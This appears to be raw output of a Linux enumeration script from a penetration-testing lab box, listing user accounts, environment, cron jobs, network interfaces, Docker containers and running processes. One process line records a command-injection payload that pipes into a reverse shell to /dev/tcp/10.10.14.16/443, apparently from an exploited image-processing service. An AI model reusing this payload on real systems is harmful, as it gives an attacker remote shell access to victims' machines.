bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
spanishdancer:x:1000:1000:spanishdancer,,,:/home/spanishdancer:/bin/bash


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root          root          4.0K Sep 16  2017 .
drwxr-xr-x 23 root          root          4.0K Sep 16  2017 ..
drwxr-xr-x  5 spanishdancer spanishdancer 4.0K Nov 13  2017 spanishdancer


### ENVIRONMENTAL #######################################
[-] Environment information:
XDG_SESSION_ID=27
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=10.10.14.16 52394 22
SSH_TTY=/dev/pts/0
USER=spanishdancer
PATH=/home/spanishdancer/bin:/home/spanishdancer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
MAIL=/var/mail/spanishdancer
PWD=/home/spanishdancer
LANG=en_US.UTF-8
HOME=/home/spanishdancer
SHLVL=2
LOGNAME=spanishdancer
LC_CTYPE=en_US.UTF-8
SSH_CONNECTION=10.10.14.16 52394 10.10.10.65 22
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1000
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


[-] Path information:
/home/spanishdancer/bin:/home/spanishdancer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Sep 16  2017 .
drwxr-xr-x 91 root root 4096 Sep 23  2017 ..
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  191 Sep 16  2017 popularity-contest

/etc/cron.daily:
total 56
drwxr-xr-x  2 root root 4096 Sep 16  2017 .
drwxr-xr-x 91 root root 4096 Sep 23  2017 ..
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep 15  2017 .
drwxr-xr-x 91 root root 4096 Sep 23  2017 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep 15  2017 .
drwxr-xr-x 91 root root 4096 Sep 23  2017 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Sep 16  2017 .
drwxr-xr-x 91 root root 4096 Sep 23  2017 ..
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
[-] Network and IP info:
br-6a905a084b79 Link encap:Ethernet  HWaddr 02:42:1c:55:42:6b
          inet addr:172.23.0.1  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::42:1cff:fe55:426b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:461 errors:0 dropped:0 overruns:0 frame:0
          TX packets:611 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:72807 (72.8 KB)  TX bytes:59468 (59.4 KB)

br-cad56989cd1a Link encap:Ethernet  HWaddr 02:42:94:cf:f0:fa
          inet addr:172.24.0.1  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::42:94ff:fecf:f0fa/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:15 errors:0 dropped:0 overruns:0 frame:0
          TX packets:20 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:420 (420.0 B)  TX bytes:1164 (1.1 KB)

docker0   Link encap:Ethernet  HWaddr 02:42:2a:cf:cc:f8
          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::42:2aff:fecf:ccf8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:648 (648.0 B)

ens33     Link encap:Ethernet  HWaddr 00:50:56:8f:65:24
          inet addr:10.10.10.65  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe8f:6524/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:fe8f:6524/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1025 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1607 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:142495 (142.4 KB)  TX bytes:194335 (194.3 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:275 errors:0 dropped:0 overruns:0 frame:0
          TX packets:275 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:41163 (41.1 KB)  TX bytes:41163 (41.1 KB)

veth1f38ce7 Link encap:Ethernet  HWaddr 36:af:2d:38:5a:1f
          inet6 addr: fe80::34af:2dff:fe38:5a1f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:556 errors:0 dropped:0 overruns:0 frame:0
          TX packets:439 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:37699 (37.6 KB)  TX bytes:37233 (37.2 KB)

veth2af0134 Link encap:Ethernet  HWaddr ba:c5:85:b1:81:06
          inet6 addr: fe80::b8c5:85ff:feb1:8106/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:1296 (1.2 KB)

veth30344cd Link encap:Ethernet  HWaddr 0e:40:af:17:18:e8
          inet6 addr: fe80::c40:afff:fe17:18e8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:15 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:1206 (1.2 KB)

veth51c7660 Link encap:Ethernet  HWaddr ce:ea:07:1a:48:27
          inet6 addr: fe80::ccea:7ff:fe1a:4827/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:465 errors:0 dropped:0 overruns:0 frame:0
          TX packets:597 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:43055 (43.0 KB)  TX bytes:40730 (40.7 KB)

vetha434322 Link encap:Ethernet  HWaddr f6:4c:58:be:a2:4d
          inet6 addr: fe80::f44c:58ff:febe:a24d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:372 errors:0 dropped:0 overruns:0 frame:0
          TX packets:542 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:53682 (53.6 KB)  TX bytes:50356 (50.3 KB)

vethac70906 Link encap:Ethernet  HWaddr aa:5f:06:af:1d:a6
          inet6 addr: fe80::a85f:6ff:feaf:1da6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:20 errors:0 dropped:0 overruns:0 frame:0
          TX packets:31 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1412 (1.4 KB)  TX bytes:3056 (3.0 KB)

vethb1bae94 Link encap:Ethernet  HWaddr 8e:7b:d2:46:ae:a0
          inet6 addr: fe80::8c7b:d2ff:fe46:aea0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:79 errors:0 dropped:0 overruns:0 frame:0
          TX packets:88 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:25689 (25.6 KB)  TX bytes:10502 (10.5 KB)

vethbffc5b4 Link encap:Ethernet  HWaddr 2a:a8:48:4c:a7:43
          inet6 addr: fe80::28a8:48ff:fe4c:a743/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:65 errors:0 dropped:0 overruns:0 frame:0
          TX packets:86 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:5160 (5.1 KB)  TX bytes:13008 (13.0 KB)


[-] ARP history:
? (172.23.0.11) at 02:42:ac:17:00:0b [ether] on br-6a905a084b79
? (172.24.0.252) at 02:42:ac:18:00:fc [ether] on br-cad56989cd1a
? (172.24.0.253) at 02:42:ac:18:00:fd [ether] on br-cad56989cd1a
? (172.23.0.253) at 02:42:ac:17:00:fd [ether] on br-6a905a084b79
? (172.23.0.252) at 02:42:ac:17:00:fc [ether] on br-6a905a084b79
? (10.10.10.2) at 00:50:56:8f:64:fe [ether] on ens33
? (10.10.10.64) at 00:50:56:8f:c4:58 [ether] on ens33
? (172.24.0.2) at 02:42:ac:18:00:02 [ether] on br-cad56989cd1a


[-] Nameserver(s):
nameserver 10.10.10.64


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0    192 10.10.10.65:22          10.10.14.16:52394       ESTABLISHED -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
tcp6       0      0 :::1022                 :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 10.10.10.65:56770       10.10.10.64:53          ESTABLISHED -


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.2  0.2  37916  5944 ?        Ss   19:34   0:04 /sbin/init
root         2  0.0  0.0      0     0 ?        S    19:34   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    19:34   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   19:34   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    19:34   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    19:34   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    19:34   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    19:34   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    19:34   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   19:34   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   19:34   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    19:34   0:00 [khungtaskd]
root        15  0.0  0.0      0     0 ?        S<   19:34   0:00 [writeback]
root        16  0.0  0.0      0     0 ?        SN   19:34   0:00 [ksmd]
root        17  0.0  0.0      0     0 ?        SN   19:34   0:00 [khugepaged]
root        18  0.0  0.0      0     0 ?        S<   19:34   0:00 [crypto]
root        19  0.0  0.0      0     0 ?        S<   19:34   0:00 [kintegrityd]
root        20  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        21  0.0  0.0      0     0 ?        S<   19:34   0:00 [kblockd]
root        22  0.0  0.0      0     0 ?        S<   19:34   0:00 [ata_sff]
root        23  0.0  0.0      0     0 ?        S<   19:34   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   19:34   0:00 [devfreq_wq]
root        28  0.0  0.0      0     0 ?        S    19:34   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        S<   19:34   0:00 [vmstat]
root        30  0.0  0.0      0     0 ?        S    19:34   0:00 [fsnotify_mark]
root        31  0.0  0.0      0     0 ?        S    19:34   0:00 [ecryptfs-kthrea]
root        47  0.0  0.0      0     0 ?        S<   19:34   0:00 [kthrotld]
root        48  0.0  0.0      0     0 ?        S<   19:34   0:00 [acpi_thermal_pm]
root        49  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        50  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        51  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        53  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_0]
root        58  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_0]
root        59  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_1]
root        60  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_1]
root        66  0.0  0.0      0     0 ?        S<   19:34   0:00 [ipv6_addrconf]
root        67  0.0  0.0      0     0 ?        S    19:34   0:00 [kworker/0:2]
root        80  0.0  0.0      0     0 ?        S<   19:34   0:00 [deferwq]
root        81  0.0  0.0      0     0 ?        S<   19:34   0:00 [charger_manager]
root       129  0.0  0.0      0     0 ?        S<   19:34   0:00 [kpsmoused]
root       131  0.0  0.0      0     0 ?        S<   19:34   0:00 [ttm_swap]
root       159  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_2]
root       160  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_2]
root       161  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_3]
root       162  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_3]
root       163  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_4]
root       164  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_4]
root       165  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_5]
root       166  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_5]
root       167  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_6]
root       168  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_6]
root       169  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_7]
root       170  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_7]
root       171  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_8]
root       172  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_8]
root       173  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_9]
root       174  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_9]
root       175  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_10]
root       176  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_10]
root       177  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_11]
root       178  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_11]
root       179  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_12]
root       180  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_12]
root       181  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_13]
root       182  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_13]
root       183  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_14]
root       184  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_14]
root       185  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_15]
root       186  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_15]
root       187  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_16]
root       188  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_16]
root       189  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_17]
root       190  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_17]
root       191  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_18]
root       192  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_18]
root       193  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_19]
root       194  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_19]
root       195  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_20]
root       196  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_20]
root       197  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_21]
root       198  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_21]
root       199  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_22]
root       200  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_22]
root       201  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_23]
root       202  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_23]
root       203  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_24]
root       204  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_24]
root       205  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_25]
root       206  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_25]
root       207  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_26]
root       208  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_26]
root       209  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_27]
root       210  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_27]
root       211  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_28]
root       212  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_28]
root       213  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_29]
root       214  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_29]
root       215  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_30]
root       216  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_30]
root       217  0.0  0.0      0     0 ?        S    19:34   0:00 [scsi_eh_31]
root       218  0.0  0.0      0     0 ?        S<   19:34   0:00 [scsi_tmf_31]
root       241  0.0  0.0      0     0 ?        S    19:34   0:00 [kworker/u2:26]
root       243  0.0  0.0      0     0 ?        S    19:34   0:00 [kworker/u2:28]
root       248  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root       249  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root       250  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root       257  0.0  0.0      0     0 ?        S<   19:34   0:00 [kworker/0:1H]
root       325  0.0  0.0      0     0 ?        S<   19:34   0:00 [raid5wq]
root       350  0.0  0.0      0     0 ?        S<   19:34   0:00 [kdmflush]
root       351  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root       360  0.0  0.0      0     0 ?        S<   19:34   0:00 [kdmflush]
root       361  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root       378  0.0  0.0      0     0 ?        S<   19:34   0:00 [bioset]
root       406  0.0  0.0      0     0 ?        S    19:34   0:00 [jbd2/dm-0-8]
root       407  0.0  0.0      0     0 ?        S<   19:34   0:00 [ext4-rsv-conver]
root       469  0.0  0.1  29648  3124 ?        Ss   19:34   0:00 /lib/systemd/systemd-journald
root       476  0.0  0.0      0     0 ?        S<   19:34   0:00 [iscsi_eh]
root       482  0.0  0.0      0     0 ?        S    19:34   0:00 [kauditd]
root       494  0.0  0.0      0     0 ?        S<   19:34   0:00 [ib_addr]
root       496  0.0  0.0      0     0 ?        S<   19:34   0:00 [ib_mcast]
root       498  0.0  0.0 102968  1624 ?        Ss   19:34   0:00 /sbin/lvmetad -f
root       499  0.0  0.0      0     0 ?        S<   19:34   0:00 [ib_nl_sa_wq]
root       506  0.0  0.0      0     0 ?        S<   19:34   0:00 [ib_cm]
root       511  0.0  0.0      0     0 ?        S<   19:34   0:00 [iw_cm_wq]
root       514  0.0  0.0      0     0 ?        S<   19:34   0:00 [rdma_cm]
root       517  0.0  0.1  44680  4096 ?        Ss   19:34   0:00 /lib/systemd/systemd-udevd
root       776  0.0  0.0      0     0 ?        S<   19:34   0:00 [ext4-rsv-conver]
systemd+   829  0.0  0.1 100324  2484 ?        Ssl  19:34   0:00 /lib/systemd/systemd-timesyncd
root       986  0.0  0.3 275768  6280 ?        Ssl  19:34   0:00 /usr/lib/accountsservice/accounts-daemon
daemon     995  0.0  0.1  26044  2312 ?        Ss   19:34   0:00 /usr/sbin/atd -f
root       998  0.0  0.1  28548  3112 ?        Ss   19:34   0:00 /lib/systemd/systemd-logind
root      1002  0.0  0.0   4400   700 ?        Ss   19:34   0:00 /usr/sbin/acpid
root      1003  0.0  0.4 185608  9676 ?        Ssl  19:34   0:01 /usr/bin/vmtoolsd
root      1008  0.0  0.0  95368  1396 ?        Ssl  19:34   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root      1012  0.0  0.1  29008  3108 ?        Ss   19:34   0:00 /usr/sbin/cron -f
root      1023  0.0  1.1 267556 23420 ?        Ssl  19:34   0:00 /usr/lib/snapd/snapd
message+  1026  0.0  0.1  42904  3688 ?        Ss   19:34   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
syslog    1063  0.0  0.1 256396  3184 ?        Ssl  19:34   0:00 /usr/sbin/rsyslogd -n
root      1080  0.0  0.2 277180  5964 ?        Ssl  19:34   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1088  0.0  0.0  13376   172 ?        Ss   19:34   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1172  0.1  2.3 540068 48776 ?        Ssl  19:34   0:03 /usr/bin/dockerd -H fd://
root      1179  0.0  0.2  65520  5312 ?        Ss   19:34   0:00 /usr/sbin/sshd -D
root      1191  0.0  0.0   5224   160 ?        Ss   19:34   0:00 /sbin/iscsid
root      1192  0.0  0.1   5724  3528 ?        S<Ls 19:34   0:00 /sbin/iscsid
root      1228  0.0  0.7 398760 16212 ?        Ssl  19:34   0:01 docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --shim docker-containerd-shim --runtime docker-runc
root      1294  0.0  0.0  15940  1816 tty1     Ss+  19:34   0:00 /sbin/agetty --noclear tty1 linux
root      1677  0.0  0.1 100016  2596 ?        Sl   19:34   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.23.0.252 -container-port 443
root      1735  0.0  0.2 207328  5212 ?        Sl   19:34   0:00 docker-containerd-shim e980d631b20eba4a26360fb0dfdd8b7925d3f576035dc175385777176eb62528 /var/run/docker/libcontainerd/e980d631b20eba4a26360fb0dfdd8b7925d3f576035dc175385777176eb62528 docker-runc
root      1777  0.0  0.2 207328  5120 ?        Sl   19:34   0:00 docker-containerd-shim c362989563fd4c68fafb187ebd04546bbcd0e22b669df31639a38fcb777aea0b /var/run/docker/libcontainerd/c362989563fd4c68fafb187ebd04546bbcd0e22b669df31639a38fcb777aea0b docker-runc
root      1822  0.0  0.0   4508   656 pts/0    Ss+  19:34   0:00 /bin/sh -c nginx -g 'daemon off;'
root      1824  0.0  1.3 178720 27084 pts/0    Ss+  19:34   0:00 python app.py
root      1948  0.0  1.4 176768 28872 pts/0    S+   19:34   0:00 nginx: master process nginx -g daemon off;
root      2114  0.0  0.1  42676  2944 ?        Sl   19:35   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 1022 -container-ip 172.23.0.253 -container-port 22
root      2153  0.0  0.2 272864  5088 ?        Sl   19:35   0:00 docker-containerd-shim 7786500c3e80070a5a10cc475cdcba2d51fedacfb5e8190c0c96ddd972475109 /var/run/docker/libcontainerd/7786500c3e80070a5a10cc475cdcba2d51fedacfb5e8190c0c96ddd972475109 docker-runc
root      2179  0.0  0.2  61396  5292 pts/0    Ss+  19:35   0:00 /usr/sbin/sshd -D
root      2268  0.0  0.2 272864  5136 ?        Sl   19:35   0:00 docker-containerd-shim f09d48cdcc746621333ff91323d5a0677371d2ab33858b4c7be3d79b4b5abe3c /var/run/docker/libcontainerd/f09d48cdcc746621333ff91323d5a0677371d2ab33858b4c7be3d79b4b5abe3c docker-runc
root      2302  0.0  0.1  18180  3148 pts/0    Ss+  19:35   0:00 /bin/bash
root      2370  0.0  0.2 207328  5116 ?        Sl   19:35   0:00 docker-containerd-shim eaf0202889f6526b64a6285968681f1b065aba3a0cd16a034073532fbc154b76 /var/run/docker/libcontainerd/eaf0202889f6526b64a6285968681f1b065aba3a0cd16a034073532fbc154b76 docker-runc
root      2405  0.0  0.1  19556  3160 pts/0    Ss+  19:35   0:00 /bin/bash
root      2640  0.0  1.2 177228 25740 pts/0    S+   19:35   0:00 nginx: worker process
root      2643  0.0  0.1  11640  2556 pts/0    S+   19:35   0:00 sh -c "curl" -s -k -o "/tmp/magick-eIsMlV5i" "https://"|setsid /bin/bash -i >& /dev/tcp/10.10.14.16/443 0<&1 2>&1""
root      2645  0.0  0.1  11780  2948 ?        Ss   19:35   0:00 /bin/bash -i
root      2711  0.0  0.2  66028  5576 ?        Ss   19:37   0:00 sshd: root@pts/1
root      2713  0.0  0.1  18200  3360 ?        Ss+  19:37   0:00 -bash
